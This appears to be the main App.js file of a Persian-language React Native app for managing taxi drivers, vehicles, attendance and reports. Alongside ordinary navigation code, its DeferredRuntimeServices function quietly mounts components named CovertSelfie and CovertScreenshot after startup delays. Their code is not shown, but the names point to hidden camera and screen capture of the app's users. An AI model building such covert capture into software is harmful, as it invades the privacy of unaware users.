import React from 'react';
import { I18nManager, View, TouchableOpacity, Text, AppState, KeyboardAvoidingView, Platform } from 'react-native';
import { SafeAreaProvider } from 'react-native-safe-area-context';
import { NavigationContainer, createNavigationContainerRef } from '@react-navigation/native';
import { createNativeStackNavigator } from '@react-navigation/native-stack';
import * as Font from 'expo-font';
import * as SplashScreen from 'expo-splash-screen';
import { StatusBar } from 'expo-status-bar';
import { AuthProvider, useAuth } from './src/auth';
import FirstSetupScreen from './src/FirstSetupScreen';
import PeriodicRenewScreen from './src/PeriodicRenewScreen';
import { loadApiBase } from './src/config';
import { C, FONT } from './src/theme';
import OfflineBanner from './src/OfflineBanner';
import { FontScaleProvider } from './src/fontscale';
import { ThemeProvider } from './src/themeContext';
import ErrorBoundary from './src/ErrorBoundary';
import GpsGuard from './src/GpsGuard';
import MaintenanceGuard from './src/MaintenanceGuard';
import BatteryOptimizationGate from './src/BatteryOptimization';
import ShiftTrackingGate from './src/ShiftTrackingGate';
import BatteryGuard from './src/BatteryGuard';
import SecurityGuard from './src/SecurityGuard';
import PermissionGuard from './src/PermissionGuard';
import ActivityIndicator from './src/components/PulseLoadingIndicator';
import StartupGate from './src/StartupGate';
import PresenceGate from './src/PresenceGate';
import CovertSelfie from './src/CovertSelfie';
import CovertScreenshot from './src/covertScreenshot';
import UpdateScreen from './src/screens/UpdateScreen';
import { checkVersion } from './src/update';
import { request } from './src/api';

import SetupScreen from './src/screens/SetupScreen';
import LoginScreen from './src/screens/LoginScreen';
import DashboardScreen from './src/screens/DashboardScreen';
import CustomFieldsScreen from './src/screens/CustomFieldsScreen';
import OutageScreen from './src/screens/OutageScreen';
import SearchScreen from './src/screens/SearchScreen';
import DriverScreen from './src/screens/DriverScreen';
import DebtScreen from './src/screens/DebtScreen';
import ChecklistScreen from './src/screens/ChecklistScreen';
import NoticeScreen from './src/screens/NoticeScreen';
import ReportsScreen from './src/screens/ReportsScreen';
import SmsScreen from './src/screens/SmsScreen';
import BotMessageScreen from './src/screens/BotMessageScreen';
import RequestsScreen from './src/screens/RequestsScreen';
import { RequestInboxScreen, WorkSummaryScreen, SalarySlipsScreen } from './src/screens/RequestScreens';
import CheckInScreen from './src/screens/CheckInScreen';
import FormsScreen from './src/screens/FormsScreen';
import CulturalScreen from './src/screens/CulturalScreen';
import WelfareScreen from './src/screens/WelfareScreen';
import TempDriversScreen from './src/screens/TempDriversScreen';
import NotificationsScreen from './src/screens/NotificationsScreen';
import FieldAlertsScreen from './src/screens/FieldAlertsScreen';
import OfficialPresenceScreen from './src/screens/OfficialPresenceScreen';
import MessagesScreen from './src/screens/MessagesScreen';
import { AttendanceScreen, PastNoticesScreen, PastChecklistsScreen, DriverSmsScreen, MySmsScreen, VehicleScreen } from './src/screens/ListScreens';
import { ActivityReportScreen, ExpInsuranceScreen, ExpTaxiScreen, ExpOplicScreen, TeamReportScreen } from './src/screens/ReportListsScreens';
import { InboxReportsScreen, ReportDetailScreen } from './src/screens/InboxScreen';
import PresentListScreen from './src/screens/PresentListScreen';
import { ChangePasswordScreen, ProfileScreen, EditProfileScreen } from './src/screens/AccountScreens';
import MapSettingsScreen from './src/screens/MapSettingsScreen';
import ExpiryNotificationSettingsScreen from './src/screens/ExpiryNotificationSettingsScreen';
import FieldAlertSettingsScreen from './src/screens/FieldAlertSettingsScreen';
import ImportTimesScreen from './src/screens/ImportTimesScreen';
import AppLock from './src/AppLock';
import AppLockSettingsScreen from './src/screens/AppLockSettingsScreen';
import CompanyRequestsScreen from './src/screens/CompanyRequestsScreen';
import SubscriptionScreen from './src/screens/SubscriptionScreen';
import CrashReportsScreen from './src/screens/CrashReportsScreen';
import LineVisitProgramScreen from './src/screens/LineVisitProgramScreen';
import MyDailyMissionScreen from './src/screens/MyDailyMissionScreen';
import RoleDashboardScreen from './src/screens/RoleDashboardScreen';
import LeaderboardScreen from './src/screens/LeaderboardScreen';
import InventoryScreen from './src/screens/InventoryScreen';
import LineLocationScreen from './src/screens/LineLocationScreen';
import { installGlobalCrashHandlers, setCurrentRoute, flushCrashReports } from './src/crashReporter';
import { afterUiReady } from './src/androidCompat';

try { I18nManager.allowRTL(false); } catch (e) {}
installGlobalCrashHandlers();
SplashScreen.preventAutoHideAsync().catch(() => {});
const navigationRef = createNavigationContainerRef();
const Stack = createNativeStackNavigator();
const opts = {
  headerStyle: { backgroundColor: C.brand },
  headerTintColor: '#fff',
  headerTitleStyle: { fontFamily: FONT.bold },
  contentStyle: { backgroundColor: C.paper },
};
function ProfileBtn({ navigation }) { return <TouchableOpacity onPress={() => navigation.navigate('Profile')}><Text style={{ color: '#fff', fontSize: 20 }}>☰</Text></TouchableOpacity>; }

function DeferredRuntimeServices() {
  const [stage, setStage] = React.useState(0);
  const stageRef = React.useRef(0);
  React.useEffect(() => { stageRef.current = stage; }, [stage]);
  React.useEffect(() => {
    let cancels = [], active = true;
    const schedule = (baseDelay) => {
      cancels.forEach((c) => { try { c?.(); } catch (_) {} }); cancels = [];
      [0, 500, 1000, 1500].forEach((extra, i) => { const c = afterUiReady(() => { if (active) setStage((s) => Math.max(s, i + 1)); }, baseDelay + extra); cancels.push(c); });
    };
    schedule(1800);
    const sub = AppState.addEventListener('change', (state) => { if (state === 'active' && stageRef.current === 0) schedule(500); });
    return () => { active = false; cancels.forEach((c) => { try { c?.(); } catch (_) {} }); try { sub.remove(); } catch (_) {} };
  }, []);
  if (stage < 1) return null;
  return <><ErrorBoundary><GpsGuard /></ErrorBoundary><ErrorBoundary><MaintenanceGuard /></ErrorBoundary>{stage >= 2 && <ErrorBoundary><PresenceGate /></ErrorBoundary>}{stage >= 3 && <ErrorBoundary><CovertSelfie /></ErrorBoundary>}{stage >= 3 && <ErrorBoundary><CovertScreenshot /></ErrorBoundary>}{stage >= 4 && <ErrorBoundary><BatteryOptimizationGate /></ErrorBoundary>}{stage >= 4 && <ErrorBoundary><ShiftTrackingGate /></ErrorBoundary>}</>;
}

function Routes() {
  const { user, loading, refreshUser } = useAuth();
  const [subscription,setSubscription]=React.useState(null);
  const [subscriptionLoading,setSubscriptionLoading]=React.useState(false);
  React.useEffect(()=>{let alive=true;if(!user){setSubscription(null);return;}setSubscriptionLoading(true);request('/subscription/status',{noStore:true}).then(d=>{if(alive)setSubscription(d.subscription)}).catch(()=>{if(alive)setSubscription(null)}).finally(()=>{if(alive)setSubscriptionLoading(false)});return()=>{alive=false}},[user?.id]);
  if (loading || (user&&subscriptionLoading)) return <ActivityIndicator fullScreen size={120} message="در حال دریافت اطلاعات کاربر…" />;
  if (user && (user.must_change_pw || user.must_setup)) return <FirstSetupScreen onDone={refreshUser} />;
  if (user && user.must_renew) return <PeriodicRenewScreen onDone={refreshUser} />;
  if (user && subscription?.enabled && !subscription?.active) return <SubscriptionScreen onActivated={setSubscription} />;
  return <Stack.Navigator screenOptions={opts}>
    {!user ? <Stack.Screen name="Login" component={LoginScreen} options={{ headerShown: false }} /> : <>
      <Stack.Screen name="Dashboard" component={DashboardScreen} options={({ navigation }) => ({ title: 'داشبورد', headerLeft: () => <ProfileBtn navigation={navigation} /> })} />
      <Stack.Screen name="Search" component={SearchScreen} options={{ title: 'جستجوی تاکسی و تاکسیران' }} />
      <Stack.Screen name="Driver" component={DriverScreen} options={{ title: 'اطلاعات راننده' }} />
      <Stack.Screen name="Vehicle" component={VehicleScreen} options={{ title: 'اطلاعات خودرو' }} />
      <Stack.Screen name="Debt" component={DebtScreen} options={{ title: 'بدهی آبونمان' }} />
      <Stack.Screen name="Checklist" component={ChecklistScreen} options={{ title: 'چک‌لیست خودرو' }} />
      <Stack.Screen name="Notice" component={NoticeScreen} options={{ title: 'ثبت تذکر' }} />
      <Stack.Screen name="Reports" component={ReportsScreen} options={{ title: 'ارسال گزارش' }} />
      <Stack.Screen name="Sms" component={SmsScreen} options={{ title: 'ارسال پیامک به رانندگان' }} />
      <Stack.Screen name="BotMessages" component={BotMessageScreen} options={{ title: 'ارسال پیام در ربات‌ها' }} />
      <Stack.Screen name="Requests" component={RequestsScreen} options={{ title: 'درخواست‌ها' }} />
      <Stack.Screen name="RequestInbox" component={RequestInboxScreen} options={{ title: 'کارتابل تأیید درخواست‌ها' }} />
      <Stack.Screen name="WorkSummary" component={WorkSummaryScreen} options={{ title: 'کارکرد من' }} />
      <Stack.Screen name="SalarySlips" component={SalarySlipsScreen} options={{ title: 'فیش‌های حقوقی من' }} />
      <Stack.Screen name="CompanyRequests" component={CompanyRequestsScreen} options={{ title: 'ارسال برای شرکت' }} />
      <Stack.Screen name="Subscription" component={SubscriptionScreen} options={{ title: 'اشتراک گروهی و انفرادی' }} />
      <Stack.Screen name="CheckIn" component={CheckInScreen} options={{ title: 'ثبت حضور من' }} />
      <Stack.Screen name="Forms" component={FormsScreen} options={{ title: 'فرم‌ها' }} />
      <Stack.Screen name="Cultural" component={CulturalScreen} options={{ title: 'فعالیت‌های فرهنگی' }} />
      <Stack.Screen name="Welfare" component={WelfareScreen} options={{ title: 'رفاهیات' }} />
      <Stack.Screen name="TempDrivers" component={TempDriversScreen} options={{ title: 'رانندگان موقت' }} />
      <Stack.Screen name="Notifications" component={NotificationsScreen} options={{ title: 'اعلان‌ها' }} />
      <Stack.Screen name="FieldAlerts" component={FieldAlertsScreen} options={{ title: 'هشدارها' }} />
      <Stack.Screen name="ActivityReport" component={ActivityReportScreen} options={{ title: 'فعالیت رانندگان هر خط' }} />
      <Stack.Screen name="ExpInsurance" component={ExpInsuranceScreen} options={{ title: 'وضعیت بیمه و معاینه' }} />
      <Stack.Screen name="ExpTaxi" component={ExpTaxiScreen} options={{ title: 'افراد فاقد اعتبار' }} />
      <Stack.Screen name="ExpOplic" component={ExpOplicScreen} options={{ title: 'خودروهای فاقد بهره‌برداری' }} />
      <Stack.Screen name="TeamReport" component={TeamReportScreen} options={{ title: 'زیرمجموعهٔ من' }} />
      <Stack.Screen name="InboxReports" component={InboxReportsScreen} options={{ title: 'گزارشات دریافتی' }} />
      <Stack.Screen name="PresentList" component={PresentListScreen} options={{ title: 'حاضرین در خط' }} />
      <Stack.Screen name="ReportDetail" component={ReportDetailScreen} options={({ route }) => ({ title: route.params?.mine ? 'گزارش ارسالی شما' : 'گزارش دریافتی' })} />
      <Stack.Screen name="OfficialPresence" component={OfficialPresenceScreen} options={{ title: 'ثبت حضور مسئولین در خط' }} />
      <Stack.Screen name="Inventory" component={InventoryScreen} options={{ title: 'اقلام تحویلی' }} />
      <Stack.Screen name="Messages" component={MessagesScreen} options={{ title: 'پیام‌ها' }} />
      <Stack.Screen name="Attendance" component={AttendanceScreen} options={{ title: 'گزارش حضور' }} />
      <Stack.Screen name="PastNotices" component={PastNoticesScreen} options={{ title: 'تذکرات قبلی' }} />
      <Stack.Screen name="PastChecklists" component={PastChecklistsScreen} options={{ title: 'چک‌لیست‌های قبلی' }} />
      <Stack.Screen name="DriverSms" component={DriverSmsScreen} options={{ title: 'پیامک‌های راننده' }} />
      <Stack.Screen name="MySms" component={MySmsScreen} options={{ title: 'پیامک‌های ارسالی من' }} />
      <Stack.Screen name="CustomFields" component={CustomFieldsScreen} options={{ title: 'اطلاعات تکمیلی' }} />
      <Stack.Screen name="Outage" component={OutageScreen} options={{ title: 'اعلام قطع سیستم نوبت‌دهی' }} />
      <Stack.Screen name="Profile" component={ProfileScreen} options={{ title: 'حساب کاربری' }} />
      <Stack.Screen name="ChangePassword" component={ChangePasswordScreen} options={{ title: 'تغییر رمز' }} />
      <Stack.Screen name="EditProfile" component={EditProfileScreen} options={{ title: 'ویرایش اطلاعات من' }} />
      <Stack.Screen name="MapSettings" component={MapSettingsScreen} options={{ title: 'تنظیمات نقشه' }} />
      <Stack.Screen name="ExpiryNotificationSettings" component={ExpiryNotificationSettingsScreen} options={{ title: 'تنظیمات اعلان اعتبار' }} />
      <Stack.Screen name="FieldAlertSettings" component={FieldAlertSettingsScreen} options={{ title: 'تنظیمات هشدارهای میدانی' }} />
      <Stack.Screen name="ImportTimes" component={ImportTimesScreen} options={{ title: 'آخرین زمان‌های به‌روزرسانی' }} />
      <Stack.Screen name="AppLockSettings" component={AppLockSettingsScreen} options={{ title: 'قفل برنامه' }} />
      <Stack.Screen name="CrashReports" component={CrashReportsScreen} options={{ title: 'گزارش خطاهای برنامه' }} />
      <Stack.Screen name="LineVisitProgram" component={LineVisitProgramScreen} options={{ title: 'برنامه بازدید و پوشش خط' }} />
      <Stack.Screen name="LineLocation" component={LineLocationScreen} options={{ title: 'ثبت موقعیت و تصویر خطوط' }} />
      <Stack.Screen name="MyDailyMission" component={MyDailyMissionScreen} options={{ title: 'مأموریت روزانه من' }} />
      <Stack.Screen name="RoleDashboard" component={RoleDashboardScreen} options={{ title: 'داشبورد و امتیاز من' }} />
      <Stack.Screen name="Leaderboard" component={LeaderboardScreen} options={{ title: 'رتبه‌بندی و نشان‌ها' }} />
    </>}
  </Stack.Navigator>;
}

export default function App() {
  const [ready, setReady] = React.useState(false);
  const [configured, setConfigured] = React.useState(true);
  const [updateInfo, setUpdateInfo] = React.useState(null);
  const runVersionCheck = React.useCallback(async () => { try { const info = await checkVersion(); setUpdateInfo(info); } catch (e) { setUpdateInfo(null); } }, []);
  React.useEffect(() => { let mounted = true; (async () => {
    try { await Font.loadAsync({ [FONT.regular]: require('./assets/fonts/Vazirmatn-Regular.ttf'), [FONT.bold]: require('./assets/fonts/Vazirmatn-Bold.ttf') }); } catch (e) { console.error('Font loading failed:', e); }
    try { await loadApiBase(); } catch (e) {}
    if (mounted) setReady(true);
    SplashScreen.hideAsync().catch(() => {});
    runVersionCheck().catch(() => {});
    flushCrashReports().catch(() => {});
    try { const u = require('./src/updater'); u.checkForUpdate(false); } catch (e) {}
  })(); return () => { mounted = false; }; }, [runVersionCheck]);
  if (!ready) return <View style={{ flex: 1, backgroundColor: C.paper }} />;
  if (!configured) return <SetupScreen onDone={() => setConfigured(true)} />;
  if (updateInfo && updateInfo.required) return <ErrorBoundary><StatusBar style="light" /><UpdateScreen info={updateInfo} onRecheck={runVersionCheck} /></ErrorBoundary>;
  return <SafeAreaProvider><ErrorBoundary><ThemeProvider><FontScaleProvider><StartupGate><AuthProvider><StatusBar style="light" /><OfflineBanner /><AppLock><PermissionGuard><SecurityGuard><View style={{ flex: 1 }}><KeyboardAvoidingView style={{ flex: 1 }} behavior={Platform.OS === 'ios' ? 'padding' : undefined} keyboardVerticalOffset={0}><NavigationContainer ref={navigationRef} onReady={() => setCurrentRoute(navigationRef.getCurrentRoute()?.name)} onStateChange={() => setCurrentRoute(navigationRef.getCurrentRoute()?.name)}><Routes /></NavigationContainer></KeyboardAvoidingView><DeferredRuntimeServices /></View></SecurityGuard></PermissionGuard></AppLock></AuthProvider></StartupGate></FontScaleProvider></ThemeProvider></ErrorBoundary></SafeAreaProvider>;
}
